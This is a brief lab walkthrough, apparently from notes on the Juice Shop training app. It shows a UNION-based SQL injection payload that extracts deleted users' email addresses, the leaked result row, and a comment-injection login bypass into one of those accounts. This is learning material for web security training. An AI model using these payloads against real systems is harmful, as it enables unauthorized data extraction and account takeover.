- I already obtained the `Users` table schema in [[password-strength]]
- See that there is a field named 
```
`deletedAt` DATETIME
```
- Try to retrieve all deleted users
- `')) UNION SELECT 1, 2, email, deletedAt, 5, 6, 7, 8, 9 FROM Users WHERE deletedAt IS NOT NULL AND deletedAt <> ''--`
- See
```
{"id":1,"name":"2","description":"chris.pike@juice-sh.op","price":"2026-07-10 13:35:23.180 +00:00","deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},
```
- Login to his account with the username field being `chris.pike@juice-sh.op'--` (just like I did in [[login-jim]]) 
- Complete the challenge